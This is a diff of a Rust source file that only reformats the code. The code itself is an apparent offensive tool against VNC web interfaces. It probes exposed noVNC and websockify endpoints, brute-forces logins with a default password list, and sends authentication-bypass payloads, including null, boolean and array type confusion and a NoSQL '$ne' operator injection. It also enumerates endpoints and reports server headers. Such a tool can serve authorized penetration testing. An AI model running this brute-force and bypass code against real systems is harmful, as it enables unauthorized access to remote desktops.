@@ -3,7 +3,11 @@ use reqwest::Client;
 use std::time::Duration;
 
 fn build_client(timeout: u64) -> Client {
-    Client::builder().timeout(Duration::from_secs(timeout)).redirect(reqwest::redirect::Policy::none()).build().unwrap_or_else(|_| Client::new())
+    Client::builder()
+        .timeout(Duration::from_secs(timeout))
+        .redirect(reqwest::redirect::Policy::none())
+        .build()
+        .unwrap_or_else(|_| Client::new())
 }
 
 pub async fn access(url: &str, timeout: u64) -> anyhow::Result<()> {
@@ -21,7 +25,12 @@ pub async fn access(url: &str, timeout: u64) -> anyhow::Result<()> {
         println!("  {} VNC web interface exposed!", "[!]".red().bold());
     }
 
-    let web_endpoints = ["/vnc.html", "/vnc.html?autoconnect=true", "/websockify", "/vnc_lite.html"];
+    let web_endpoints = [
+        "/vnc.html",
+        "/vnc.html?autoconnect=true",
+        "/websockify",
+        "/vnc_lite.html",
+    ];
     for ep in &web_endpoints {
         let target = format!("{}{}", url.trim_end_matches('/'), ep);
         if let Ok(r) = client.get(&target).send().await {
@@ -42,19 +51,25 @@ pub async fn brute(url: &str, timeout: u64) -> anyhow::Result<()> {
     println!("{}", "-".repeat(60).dimmed());
 
     let client = build_client(timeout);
-    let passwords = ["", "password", "123456", "admin", "vnc", "root", "passw0rd", "qwerty", "secret", "12345678"];
+    let passwords = [
+        "", "password", "123456", "admin", "vnc", "root", "passw0rd", "qwerty", "secret",
+        "12345678",
+    ];
 
     for pass in &passwords {
         let body = serde_json::json!({"password": pass, "op": "login"});
-        match client.post(url).json(&body).send().await {
-            Ok(r) => {
-                let status = r.status().as_u16();
-                let text = r.text().await.unwrap_or_default();
-                if status == 200 && (text.contains("ok") || text.contains("authenticated") || text.contains("true")) {
-                    println!("  {} Password: {:15} — AUTH SUCCESS", "[+]".green().bold(), if pass.is_empty() { "(empty)" } else { pass });
-                }
+        if let Ok(r) = client.post(url).json(&body).send().await {
+            let status = r.status().as_u16();
+            let text = r.text().await.unwrap_or_default();
+            if status == 200
+                && (text.contains("ok") || text.contains("authenticated") || text.contains("true"))
+            {
+                println!(
+                    "  {} Password: {:15} — AUTH SUCCESS",
+                    "[+]".green().bold(),
+                    if pass.is_empty() { "(empty)" } else { pass }
+                );
             }
-            Err(_) => {}
         }
     }
 
@@ -72,12 +87,21 @@ pub async fn bypass(url: &str, timeout: u64) -> anyhow::Result<()> {
         ("Empty password", r#"{"password":"","op":"login"}"#),
         ("Null password", r#"{"password":null,"op":"login"}"#),
         ("Type confusion", r#"{"password":true,"op":"login"}"#),
-        ("Array bypass", r#"{"password":["admin","password"],"op":"login"}"#),
+        (
+            "Array bypass",
+            r#"{"password":["admin","password"],"op":"login"}"#,
+        ),
         ("Object bypass", r#"{"password":{"$ne":null},"op":"login"}"#),
     ];
 
     for (name, payload) in &bypass_payloads {
-        match client.post(url).header("Content-Type", "application/json").body(*payload).send().await {
+        match client
+            .post(url)
+            .header("Content-Type", "application/json")
+            .body(*payload)
+            .send()
+            .await
+        {
             Ok(r) => {
                 let status = r.status().as_u16();
                 let text = r.text().await.unwrap_or_default();
@@ -110,7 +134,12 @@ pub async fn enumerate(url: &str, timeout: u64) -> anyhow::Result<()> {
                 let headers = r.headers().clone();
                 let text = r.text().await.unwrap_or_default();
                 if status == 200 {
-                    println!("  {} {:20} — {} bytes", "[+]".green().bold(), ep, text.len());
+                    println!(
+                        "  {} {:20} — {} bytes",
+                        "[+]".green().bold(),
+                        ep,
+                        text.len()
+                    );
                     if let Some(server) = headers.get("server") {
                         println!("    Server: {}", server.to_str().unwrap_or("unknown"));
                     }
